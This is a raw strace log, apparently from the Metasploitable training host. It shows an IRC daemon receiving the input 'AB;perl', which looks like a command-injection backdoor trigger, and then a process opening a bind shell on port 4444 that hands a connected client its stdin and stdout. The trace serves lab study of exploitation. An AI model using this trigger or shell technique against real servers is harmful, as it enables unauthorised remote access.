12319 07:41:50.156782 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156794 stat64("/lib/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.156805 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156817 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12319 07:41:50.156833 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156847 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.156859 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156872 stat64("/usr/lib/tls/i686/sse2", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.156884 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156896 stat64("/usr/lib/tls/i686/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.156908 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156920 stat64("/usr/lib/tls/i686", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.156932 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156944 stat64("/usr/lib/tls/sse2/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.156956 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156974 stat64("/usr/lib/tls/sse2", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.156988 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157027 stat64("/usr/lib/tls/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157039 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157067 stat64("/usr/lib/tls", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157078 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157091 stat64("/usr/lib/i686/sse2/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157103 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157115 stat64("/usr/lib/i686/sse2", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157127 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157140 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12319 07:41:50.157157 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157170 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12319 07:41:50.157187 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157199 stat64("/usr/lib/sse2/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157211 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157227 stat64("/usr/lib/sse2", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157238 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157251 stat64("/usr/lib/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157262 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157274 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
12319 07:41:50.157291 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157305 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157318 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157332 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157344 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157358 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157370 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157383 stat64("/lib/i486-linux-gnu/tls/i686", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157395 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157409 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157421 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157434 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157446 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157459 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157471 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157484 stat64("/lib/i486-linux-gnu/tls", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157496 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157517 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157574 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157587 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157600 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157613 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157625 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157638 stat64("/lib/i486-linux-gnu/i686", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157649 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157663 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157675 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157687 stat64("/lib/i486-linux-gnu/sse2", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157699 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157712 stat64("/lib/i486-linux-gnu/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157727 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157739 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12319 07:41:50.157757 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157771 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157784 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157798 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157811 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157824 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157837 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157850 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157863 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157876 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157889 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157902 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157915 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157928 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157941 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157954 stat64("/usr/lib/i486-linux-gnu/tls", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157966 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.157979 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.157992 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.158092 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.158105 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.158119 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.158132 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.158144 stat64("/usr/lib/i486-linux-gnu/i686", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.158157 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.158170 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.158183 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.158196 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.158208 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.158221 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.158233 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.158246 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12319 07:41:50.158270 munmap(0xb7d44000, 29913) = 0
12319 07:41:50.158292 open("/etc/ld.so.cache", O_RDONLY) = 6
12319 07:41:50.158304 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12319 07:41:50.158321 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d44000
12319 07:41:50.158332 close(6)          = 0
12319 07:41:50.158342 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12319 07:41:50.158357 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
12319 07:41:50.158372 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12319 07:41:50.158465 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
12319 07:41:50.158486 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d39000
12319 07:41:50.158499 mmap2(0xb7d42000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7d42000
12319 07:41:50.158516 close(6)          = 0
12319 07:41:50.158540 munmap(0xb7d44000, 29913) = 0
12319 07:41:50.158556 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
12319 07:41:50.158582 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
12319 07:41:50.158600 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
12319 07:41:50.158618 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d4b000
12319 07:41:50.158629 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
12319 07:41:50.158820 close(6)          = 0
12319 07:41:50.158831 munmap(0xb7d4b000, 4096) = 0
12319 07:41:50.158850 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
12319 07:41:50.158864 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
12319 07:41:50.158881 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d4b000
12319 07:41:50.158891 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
12319 07:41:50.159099 close(6)          = 0
12319 07:41:50.159127 munmap(0xb7d4b000, 4096) = 0
12319 07:41:50.159156 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
12319 07:41:50.159178 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff558f8) = -1 EINVAL (Invalid argument)
12319 07:41:50.159192 _llseek(6, 0, 0xbff55940, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12319 07:41:50.159204 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff558f8) = -1 EINVAL (Invalid argument)
12319 07:41:50.159215 _llseek(6, 0, 0xbff55940, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12319 07:41:50.159225 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
12319 07:41:50.159282 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
12319 07:41:50.159318 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
12319 07:41:50.159344 listen(6, 5)      = 0
12319 07:41:50.159398 accept(6,  <unfinished ...>
12318 07:41:50.175811 exit_group(0)     = ?
12316 07:41:50.175896 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 12318
12316 07:41:50.175913 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12316 07:41:50.175925 --- SIGCHLD (Child exited) @ 0 (0) ---
12316 07:41:50.175934 waitpid(-1, 0xbfc22f98, WNOHANG) = -1 ECHILD (No child processes)
12316 07:41:50.175946 sigreturn()       = ? (mask now [])
12316 07:41:50.175962 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
12316 07:41:50.176017 exit_group(0)     = ?
4519  07:41:50.176086 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 12316
4519  07:41:50.176113 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:41:50.176128 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:41:50.176139 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:41:50.176149 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:41:50.176169 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:41:50.176234 gettimeofday({1495626110, 176240}, NULL) = 0
4519  07:41:50.176250 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
12319 07:41:50.501539 <... accept resumed> {sa_family=AF_INET, sin_port=htons(36015), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
12319 07:41:50.501548 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff548e8) = -1 EINVAL (Invalid argument)
12319 07:41:50.501563 _llseek(8, 0, 0xbff54930, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12319 07:41:50.501575 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff548e8) = -1 EINVAL (Invalid argument)
12319 07:41:50.501586 _llseek(8, 0, 0xbff54930, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12319 07:41:50.501595 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
12319 07:41:50.501639 close(6)          = 0
12319 07:41:50.501706 dup(8)            = 6
12319 07:41:50.501719 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff55788) = -1 EINVAL (Invalid argument)
12319 07:41:50.501730 _llseek(6, 0, 0xbff557d0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12319 07:41:50.501740 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
12319 07:41:50.501758 dup2(6, 1)        = 1
12319 07:41:50.501770 close(6)          = 0
12319 07:41:50.501780 fcntl64(1, F_SETFD, 0) = 0
12319 07:41:50.501791 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff55758) = -1 EINVAL (Invalid argument)
12319 07:41:50.501801 _llseek(1, 0, 0xbff557a0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12319 07:41:50.501829 dup(8)            = 6
12319 07:41:50.501841 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff55788) = -1 EINVAL (Invalid argument)
12319 07:41:50.501851 _llseek(6, 0, 0xbff557d0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12319 07:41:50.501860 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
12319 07:41:50.501944 dup2(6, 0)        = 0
12319 07:41:50.501959 close(6)          = 0
12319 07:41:50.501969 fcntl64(0, F_SETFD, 0) = 0
12319 07:41:50.501984 fcntl64(0, F_SETFD, 0) = 0
12319 07:41:50.502000 read(0,  <unfinished ...>
4519  07:41:50.502396 <... select resumed> ) = 1 (in [5], left {0, 680000})
4519  07:41:50.502462 clock_gettime(CLOCK_MONOTONIC, {2920, 319490867}) = 0
4519  07:41:50.502494 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:41:50.502509 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:41:50.502542 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:41:50.502558 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:41:50.502591 close(5)          = 0
4519  07:41:50.502606 time(NULL)        = 1495626110
4519  07:41:50.502616 time(NULL)        = 1495626110
4519  07:41:50.502629 gettimeofday({1495626110, 502633}, NULL) = 0
4519  07:41:50.502641 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:41:50.502669 clock_gettime(CLOCK_MONOTONIC, {2920, 319682119}) = 0
4519  07:41:50.502679 gettimeofday({1495626110, 502683}, NULL) = 0
4519  07:41:50.502690 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
12319 07:41:51.019126 <... read resumed> "", 4096) = 0
12319 07:41:51.019314 close(8)          = 0
